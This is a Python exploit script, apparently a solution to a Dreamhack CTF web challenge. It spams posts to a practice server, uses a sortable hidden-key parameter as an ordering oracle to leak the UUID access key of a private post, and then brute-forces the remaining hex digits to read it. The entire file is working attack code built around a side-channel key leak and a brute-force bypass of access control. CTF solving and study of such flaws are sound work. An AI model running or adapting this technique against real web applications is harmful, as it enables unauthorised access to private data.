import requests
import string
from bs4 import BeautifulSoup

texts = string.ascii_lowercase

url = "http://host1.dreamhack.games:17605"

for _ in range(20):
    print(_)
    for text in texts:
        requests.post(url + "/upload/", data={"inscriber": text, "title": text, "data": text})

thList = []
tdList = []

flag = ""

uuidList = {}
tmpUuidLit = {}
uuids = "0123456789abcdef"

res = requests.get(url + "/list/?sort=key.urn.9")
soup = BeautifulSoup(res.text, "lxml")
thList = [th.find_all("th")[0].text for th in soup.find_all("tr")[1:]]
for i in thList:
    uuidList[i] = ""

for i in range(9, 45):
    if i == 17 or i == 22 or i==23 or i == 27 or i == 28 or i == 32:
        for uuidId in thList:
            uuidList[uuidId] += "-"
        continue

    res = requests.get(url + "/list/?sort=key.urn."+str(i))
    soup = BeautifulSoup(res.text, "lxml")
    ascThList = [th.find_all("th")[0].text for th in soup.find_all("tr")[1:]]
    res = requests.get(url + "/list/?sort=-key.urn."+str(i))
    soup = BeautifulSoup(res.text, "lxml")
    descThList = [th.find_all("th")[0].text for th in soup.find_all("tr")[1:]]

    for uuid in uuids:
        startIndex = 0
        endIndex = len(ascThList)-1

        startId = ascThList[startIndex]
        mid = descThList.index(startId)

        cnt = 0
        for j in range(mid, endIndex+1):
            tmpUuidLit[descThList[j]] = uuid
            cnt += 1

        ascThList = ascThList[cnt:]
        descThList = descThList[:len(descThList)-cnt]

    for uuidId in tmpUuidLit.keys():
        uuidList[uuidId] += tmpUuidLit[uuidId]
        
    print(uuidList)
    print(i)
    flag = uuidList['1']
    print(flag)

for i in uuids:
    for j in uuids:
        flag = list(flag)
        flag[14] = i
        flag[19] = j
        flag = "".join(flag)
        res = requests.get(url + "/view/?id=1&key="+flag)
        print(url + "/view/?id=1&key="+flag)
        if "Key: " in res.text:
            print(res.text)
            exit()